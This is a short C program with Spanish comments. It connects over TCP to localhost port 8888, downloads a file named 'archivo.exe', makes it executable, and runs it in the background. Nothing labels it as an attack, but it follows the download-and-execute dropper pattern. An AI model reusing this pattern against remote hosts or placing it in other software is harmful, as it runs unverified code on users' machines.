#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <fcntl.h>

#define PORT 8888

int main() {
    int socket_fd;
    struct sockaddr_in server_address;
    char buffer[1024];
    FILE *file;
    int fd;

    // Se crea el socket
    socket_fd = socket(AF_INET, SOCK_STREAM, 0);

    // Se configura la dirección del servidor
    server_address.sin_family = AF_INET;
    server_address.sin_addr.s_addr = inet_addr("127.0.0.1");
    server_address.sin_port = htons(PORT);

    // Se conecta al servidor
    if (connect(socket_fd, (struct sockaddr*)&server_address, sizeof(server_address)) < 0) {
        perror("No se pudo conectar al servidor");
        return -1;
    }

    // Se solicita el archivo al servidor
    strcpy(buffer, "archivo.exe");
    send(socket_fd, buffer, strlen(buffer), 0);

    // Se crea el archivo en el que se guardará la información recibida
    file = fopen("archivo.exe", "wb");

    // Se recibe el archivo del servidor y se guarda en el archivo creado
    int count;
    while ((count = recv(socket_fd, buffer, 1024, 0)) > 0) {
        fwrite(buffer, sizeof(char), count, file);
    }

    // Se cierra el archivo y el socket
    fclose(file);
    close(socket_fd);

    // Se cambia el modo del archivo a ejecutable
    fd = open("archivo.exe", O_RDONLY);
    fchmod(fd, S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);
    close(fd);

    // Se ejecuta el archivo en segundo plano
    if (fork() == 0) {
        system("./archivo.exe &");
    }

    return 0;
}
